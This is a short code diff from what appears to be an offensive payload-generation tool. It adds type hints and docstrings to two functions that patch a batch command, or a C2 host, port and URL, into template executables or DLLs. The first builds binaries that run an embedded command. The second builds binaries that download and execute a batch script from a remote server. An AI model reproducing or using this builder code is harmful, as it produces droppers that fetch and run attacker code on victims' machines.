@@ -12,17 +12,18 @@ from make.powershell.powershell import *
 
 
 @DataTracker
-def makePeExecCmd(input, asDll) -> AceBytes:
+def makePeExecCmd(bat: str, asDll: bool) -> AceBytes:
+    """Returns an exe/dll which will execute input as bat"""
     if asDll:
         template = 'payloads/execc2cmd.dll'
     else:
         template = 'payloads/execc2cmd.exe'
     placeholderLen = 800
-    if len(input) > placeholderLen:
+    if len(bat) > placeholderLen:
         raise Exception("  Input larger than {} bytes, template too small".format(placeholderLen))
 
     placeholder = b" " * placeholderLen
-    exchange = input + " " * (placeholderLen - len(input))
+    exchange = bat + " " * (placeholderLen - len(bat))
 
     file = open(template, 'rb')
     data = file.read()
@@ -33,7 +34,8 @@ def makePeExecCmd(input, asDll) -> AceBytes:
 
 
 @DataTracker
-def makePeExecCmdC2(host, port, url, asDll) -> AceBytes:
+def makePeExecCmdC2(host: str, port: str, url: str, asDll: bool) -> AceBytes:
+    """Returns an exe/dll which will download & exec bat from host:port/url"""
     if asDll:
         template = 'payloads/execc2cmd.dll'
     else:
@@ -65,6 +67,5 @@ def makePeExecCmdC2(host, port, url, asDll) -> AceBytes:
     data = replacer(data, pHost, eHost)
     data = replacer(data, pUrl, eUrl)
     data = replacer(data, pPort, ePort)
-
     return AceBytes(data)
 
